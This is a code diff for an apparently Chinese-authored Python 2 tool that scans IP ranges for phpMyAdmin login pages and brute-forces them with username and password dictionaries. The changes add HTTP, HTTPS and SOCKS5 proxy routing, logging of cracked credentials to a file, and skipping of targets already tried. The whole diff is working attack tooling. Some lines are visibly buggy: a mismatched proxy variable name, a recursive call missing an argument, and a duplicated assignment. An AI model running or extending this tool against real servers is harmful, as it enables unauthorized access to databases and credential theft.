@@ -10,17 +10,15 @@ import requests
 import threading
 from lxml import etree
 from termcolor import *
-import pyping
+#import pyping
 import signal
 from multiprocessing import cpu_count
 from multiprocessing import Pool
 from multiprocessing import Process
-
-#def setArgs():
+import inspect
 
 def valiteIp(subIpStr):
     tmp = []
-
     if ':' in subIpStr:
         tmp += subIpStr.split('.')[0:3] + subIpStr.split('.')[-1].split(':')
         if 5 != len(tmp):
@@ -33,7 +31,6 @@ def valiteIp(subIpStr):
     for i in tmp:
         if False == i.isdigit():
             return False
-
     return True
 
 def genIpSubFromSlash(ipSubStr):
@@ -151,7 +148,23 @@ def genIpSubFromBar(ipSubStr):
 
     return result
 
+def getIpStrFromHttp(ipSubStr):
+    result = ''
+    a = ipSubStr.split(',')
+    for i in a:
+        if 'http://' in i:
+            result = result + i.split('//')[1].split('/')[0] + ','
+        elif 'https://' in i:
+            result = result + i.split('//')[1].split('/')[0] + ':443,'
+        else:
+            result = result + i + ','
+    return result
+
 def genIpList(ipSubStr, port):
+    
+    if 'http://' in ipSubStr or 'https://' in ipSubStr:
+        ipSubStr = getIpStrFromHttp(ipSubStr)
+
     result = []
     tmp = genIpSubFromComma(ipSubStr)
 #    for i in tmp:
@@ -204,33 +217,57 @@ def getDirList(dirs):
         dirFile.close()
     return result
 
-def isLoginSuccess(resp):
+def isLoginSuccess(resp, proxies):
     
-    if 0 < len(resp.text):
-        html = etree.HTML(resp.text)
-        forms = html.xpath('//form[contains(@name,"login")]')
-        if 0 >= len(forms):
-            return True
-        else:
-            return False
+    #if 0 < len(resp.text):
+    #    html = etree.HTML(resp.text)
+    #    forms = html.xpath('//form[contains(@name,"login")]')
+    #    if 0 >= len(forms):
+    #        return True
+    #    else:
+    #        return False
     if 0 < len(resp.content):
+        if 'location' in resp.headers.keys():
+            print resp.headers['location']
+        if 'Location' in resp.headers.keys():
+            print resp.headers['Location']
+
         html = etree.HTML(resp.content)
         forms = html.xpath('//form[contains(@name,"login")]')
         if 0 >= len(forms):
             return True
         else:
             return False
+    else:
+        if 2 == len(proxys):
+            if 'location' in resp.headers.keys():
+                resp = requests.get(resp.headers['location'], proxies= proxys)
+            if 'Location' in resp.headers.keys():
+                resp = requests.get(resp.headers['Location'], proxies= proxys)
+            else:
+                return False
+        else:
+            if 'location' in resp.headers.keys():
+                resp = requests.get(resp.headers['location'])
+            if 'Location' in resp.headers.keys():
+                resp = requests.get(resp.headers['Location'])
+            else:
+                return False
+        return isLoginSuccess(resp)
     return True 
 
 
 def login(loginThreadConfig, url, cookies, userName, passwd, otherArgs):
-#    sys.stdout.write('function login...\n')
     header = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0'}
-    
-    with open(loginThreadConfig['users'], 'r') as usersFile, open(loginThreadConfig['passwds'], 'r') as passwdsFiles:
+    proxys = {}
+    if loginThreadConfig.has_key('proxys'):
+        proxys = loginThreadConfig['proxys']
+
+    with open(loginThreadConfig['users'], 'r') as usersFile, open(loginThreadConfig['passwds'], 'r') as passwdsFiles, open(loginThreadConfig['logfile'], 'a') as logfile:
         uL = usersFile.readline().strip()
-        pL = passwdsFiles.readline().strip()
         while uL:
+            passwdsFiles.seek(0, 0)
+            pL = passwdsFiles.readline().strip()
             while pL:
                 postData = {userName: uL, passwd: pL}
                 tmp = postData.copy()
@@ -238,11 +275,17 @@ def login(loginThreadConfig, url, cookies, userName, passwd, otherArgs):
                 postData = tmp
 
                 #resp = requests.post(url, headers = header, cookies = cookies ,data = postData, timeout = (3, 10))
-                resp = requests.post(url, headers = header, cookies = cookies ,data = postData)
+                resp = requests.Response
+                if 2 == len(proxys):
+                    resp = requests.post(url, headers = header, cookies = cookies ,data = postData, proxies = proxys)
+                else:   
+                    resp = requests.post(url, headers = header, cookies = cookies ,data = postData)
                 sys.stdout.write(colored('login:' + url + ' username:' + uL + ' passwd:' + pL + '\n', 'white'))
                 if 200 == resp.status_code or 302 == resp.status_code:
-                    if True == isLoginSuccess(resp):
-                        sys.stdout.write(colored(url + ' [status_code:' + str(resp.status_code)+ '] [userName:' + uL + ' passwd:' + pL + ']''\n', 'green'))
+                    if True == isLoginSuccess(resp, proxys):
+                        logLine = colored(url + ' [status_code:' + str(resp.status_code)+ '] [userName:' + uL + ' passwd:' + pL + ']''\n', 'green')
+                        sys.stdout.write(logLine)
+                        #logfile.writelines(logLine)
                         with open(loginThreadConfig['out'], 'a+') as outFile:
                             outFile.writelines(url + '|' + uL + '|' + pL + '\n')
                             outFile.close()
@@ -250,11 +293,15 @@ def login(loginThreadConfig, url, cookies, userName, passwd, otherArgs):
                             break
                         else:
                             return
+                    else:
+                        logLine = colored('faile:' + url + ' username:' + uL + ' passwd:' + pL + '\n', 'red')
+                        sys.stdout.write(logLine)
+                        logfile.writelines(logLine)
                 pL = passwdsFiles.readline().strip()
-
             uL = usersFile.readline().strip()
     usersFile.close()
     passwdsFiles.close()
+    logfile.close()
 
     return
 
@@ -323,6 +370,12 @@ def bruteDir(ipLine, dirList, bruteDirThreadConfig):
     loginThreadConfig['out'] = bruteDirThreadConfig['out']
     loginThreadConfig['fc'] = bruteDirThreadConfig['fc']
     loginThreadConfig['timeout'] = bruteDirThreadConfig['timeout']
+    loginThreadConfig['logfile'] = bruteDirThreadConfig['logfile']
+    
+    proxys = {}
+    if bruteDirThreadConfig.has_key('proxys'):
+        proxys = bruteDirThreadConfig['proxys']
+        loginThreadConfig['proxys'] = bruteDirThreadConfig['proxys']
 
     timeOut = bruteDirThreadConfig['timeout']
     connectTimeOut = int(timeOut.split(',')[0])
@@ -359,16 +412,19 @@ def bruteDir(ipLine, dirList, bruteDirThreadConfig):
                 url = url + '/'
 
         try:
-            
-            resp = requests.get(url, timeout = (connectTimeOut, readDataTimeOut))
+            resp = requests.Response 
+            if 2 == len(proxys):
+                resp = requests.get(url, timeout = (connectTimeOut, readDataTimeOut), proxies = proxys)
+            else: 
+                resp = requests.get(url, timeout = (connectTimeOut, readDataTimeOut))
             if 200 == resp.status_code:
-                with open(bruteDirThreadConfig['surl'], 'a') as surlFile:
-                    surlFile.writelines(url + '\n')
-                    surlFile.close()
-                sys.stdout.write(colored(url + " [status_code:" + str(resp.status_code) + ']\n', 'green'))
                 try:
                     actionUrl, cookies, userName, passwd, otherArgs = getLoginFormArgs(resp)
                     if (None != actionUrl and '' != actionUrl) and (None != userName and '' != userName) and (None != passwd and '' != passwd):
+                        with open(bruteDirThreadConfig['surl'], 'a') as surlFile:
+                            surlFile.writelines(url + '\n')
+                            surlFile.close()
+                        sys.stdout.write(colored(url + " [status_code:" + str(resp.status_code) + ']\n', 'green'))
                         if 'http://' != actionUrl[0:7]  and 'https://' != actionUrl[0:8]:
                             if '.php' not in url: 
                                 if '/' != actionUrl[0]:
@@ -380,8 +436,6 @@ def bruteDir(ipLine, dirList, bruteDirThreadConfig):
                                     actionUrl = baseUrl + '/' + actionUrl
                                 else:
                                     actionUrl = baseUrl + actionUrl
-                        else:
-                            sys.stdout.write('---------->\n')
                         
                         t = threading.Thread(target=login, args=(loginThreadConfig, actionUrl, cookies, userName, passwd, otherArgs, ))
                         t.setDaemon(True)
@@ -389,16 +443,25 @@ def bruteDir(ipLine, dirList, bruteDirThreadConfig):
                         t.join()
 
                     else:
-                        sys.stdout.write(colored('something error! actionUrl: ' + actionUrl + ' userName: ' +  userName + ' passwd: '+ passwd + '\n', 'red'))
+                        with open(bruteDirThreadConfig['furl'], 'a') as furlFile:
+                            furlFile.writelines(url + ' cannot-find-login-froms [' + str(resp.status_code) + ']\n')
+                            furlFile.close()
+                        sys.stdout.write(colored('cannot find login forms! actionUrl: ' + actionUrl + ' userName: ' +  userName + ' passwd: '+ passwd + '\n', 'red'))
                 except Exception, e:
                     sys.stdout.write(str(e) + '\n')
                 break
 
             else:
                 sys.stdout.write(colored(url + " [status_code:" + str(resp.status_code) + ']\n', 'yellow'))
+                with open(bruteDirThreadConfig['furl'], 'a') as furlFile:
+                    furlFile.writelines(url + ' [' + str(resp.status_code) + ']\n')
+                    furlFile.close()
 
         except Exception, e:
             sys.stdout.write(colored(url + ' [connect-error]\n', 'red'))
+            with open(bruteDirThreadConfig['furl'], 'a') as furlFile:
+                furlFile.writelines(url + ' [connect-error]\n')
+                furlFile.close()
     
     return
 
@@ -447,11 +510,43 @@ def subWorkers(cpuCnt, subIpList, dirList, bruteDirThreadConfig):
 
     return
 
+def isIp(Str):
+    tmp = Str.split('.')
+    if 4 != len(tmp):
+        return False
+    for i in tmp:
+        if False == i.isdigit():
+            return False
+    return True
+
+
+def getTestedUrlIps(fileName):
+    result = set()
+    
+    if False == os.path.exists(fileName) or False == os.access(fileName, os.R_OK):
+        return result
+
+    with open(fileName, 'r') as f:
+        line = f.readline().strip()
+        while line:
+            tmp = line.split('/')[2]
+            if ':' not in tmp and isIp(tmp):
+                tmp += ':80'
+            result.add(tmp)
+            line = f.readline().strip()
+        f.close()
+    return result
 
 if __name__ == '__main__':
     cpuCnt = cpu_count()
     ipsf = ''
     ipList = []
+    proxys = {}
+
+    current_path=inspect.getfile(inspect.currentframe())
+    dir_name=os.path.dirname(current_path)
+    file_abs_path=os.path.abspath(dir_name)
+    pwd = file_abs_path
     
     parser = argparse.ArgumentParser(formatter_class=argparse.RawTextHelpFormatter, description='使用说明')
     parser.add_argument('-ipsf', help='指定目标ip 目标域名 目标ip:端口 目标域名:端口记录文件')
@@ -459,22 +554,22 @@ if __name__ == '__main__':
     parser.add_argument('-port', default = '80',
                                     help='指定端口.(默认:80')
 
-    parser.add_argument('-dirs', default = 'configs/dirs-lists/dir-list.txt',
+    parser.add_argument('-dirs', default = pwd + '/configs/dirs-lists/dir-list.txt',
                                     help='爆破路径的字典文件.(默认: config/dirs-lists/comment-dirs.txt)')
 
-    parser.add_argument('-users', default = 'configs/users-lists/comment-list.txt',
+    parser.add_argument('-users', default = pwd + '/configs/users-lists/comment-list.txt',
                                     help='指定爆破登录时所用的用户名字典文件(默认: config/users-list/comment-list.txt)')
 
-    parser.add_argument('-passwds', default = 'configs/passwds-lists/comment-passwds.txt',
+    parser.add_argument('-passwds', default = pwd + '/configs/passwds-lists/comment-passwds.txt',
                                     help='指定爆破登录时所使用的密码字典文件.(默认: config/passwds-lists/comment-passwds.txt)')
 
     parser.add_argument('-proxy', default = 'http://127.0.0.1:8118',
                                     help='指定代理地址，不使用代理请指定参数为n. (默认: http://127.0.0.1:8118)')
 
-    parser.add_argument('-success', default = 'configs/success-list/comment-success.txt',
+    parser.add_argument('-success', default = pwd + '/configs/success-list/comment-success.txt',
                                     help='指定爆破登录成功时出现的一些特殊字符字典文件.(默认: comment-success.txt)')
 
-    parser.add_argument('-failed', default = 'configs/failed-lists/comment-failed.txt',
+    parser.add_argument('-failed', default = pwd + '/configs/failed-lists/comment-failed.txt',
                                     help='指定爆破登录时失败时出现的一些特征字符字典文件.(默认: comment-failed.txt)')
 
     parser.add_argument('-out', default = 'url-user-passwd-pair.txt',
@@ -482,10 +577,15 @@ if __name__ == '__main__':
 
     parser.add_argument('-surl', default = 'success-urls.txt',
                                     help='指定保存在phpMyAdmin后台登陆的URL的文件.(默认: success-urls.txt)')
+    
+    parser.add_argument('-furl', default = 'failed-urls.txt',
+                                    help='指定保存不存在phpMyAdmin后台登陆的URL的文件.(默认: failed-urls.txt)')
 
     logfile = 'logs/' + time.strftime('%Y-%m-%d-%H:%M:%S', time.localtime()) + '-log.txt'
     parser.add_argument('-logfile', default = logfile,
                                     help='指定保存日志的文件，不使用日志文件而时输出到终端的指定参数为n.(默认: log.txt)')
+    if not os.path.exists('logs'):
+        os.mkdir('logs')
 
     parser.add_argument('-ca', default = 'y',
                                     help='指定是否输出最终执行时的参数.[y/Y, n/N] y或者Y输出，否则不输出. (默认: y)')
@@ -498,8 +598,15 @@ if __name__ == '__main__':
 
     parser.add_argument('-timeout', default='1,3',
                                     help='指定超时参数，默认为:1,3. 1是指连接超时时间为1秒，3是指读取数据的超时时间为3秒. 超时将触发超时错误然后略过该ip.')
-#    parser.add_argument('-statCode', help='指定成功返回登录界面的状态码参数. (默认: 200)')
-#    parser.add_argument('-StatCode', help='指定成功返回登录界面时的状态码文件。 (默认: 无)')
+    
+    parser.add_argument('-http_proxy',
+                                    help='指定http请求代理.')
+
+    parser.add_argument('-https_proxy',
+                                    help='指定https请求代理.')
+    
+    parser.add_argument('-socks5_proxy',
+                                    help='指定socks5请求代理.(http和https请求都会被socks5代理)')
 
     args = parser.parse_args()
 
@@ -524,6 +631,20 @@ if __name__ == '__main__':
         ipsb = args.ipsb
         ipList = genIpList(ipsb, args.port)
 
+    failedList = list(getTestedUrlIps(args.furl))
+    successedList = list(getTestedUrlIps(args.surl))
+    ipList = list(set(ipList) - set(failedList) - set(successedList)) 
+
+    if args.http_proxy is not None:
+        proxys['http'] = args.http_proxy
+    if args.https_proxy is not None:
+        proxys['https'] = args.https_proxy
+
+    if args.http_proxy is None and args.https_proxy is None and args.socks5_proxy is not None:
+        proxys['https'] = args.socks5_proxy
+        proxys['https'] = args.socks5_proxy
+        
+
 #    print 'scan ip list:'
 #    for i in ipList:
 #        print i
@@ -542,10 +663,14 @@ if __name__ == '__main__':
     bruteDirThreadConfig['users'] = args.users
     bruteDirThreadConfig['passwds'] = args.passwds
     bruteDirThreadConfig['surl'] = args.surl
+    bruteDirThreadConfig['furl'] = args.furl
     bruteDirThreadConfig['fc'] = args.fc
     bruteDirThreadConfig['out'] = args.out
     bruteDirThreadConfig['tn'] = args.tn
     bruteDirThreadConfig['timeout'] = args.timeout
+    bruteDirThreadConfig['logfile'] = args.logfile
+    if 2 == len(proxys):
+        bruteDirThreadConfig['proxys'] = proxys
 
     if cpuCnt > len(ipList):
         #proccess = Process(target = subWorkers, args=(cpuCnt, ipList, dirList, bruteDirThreadConfig, ))
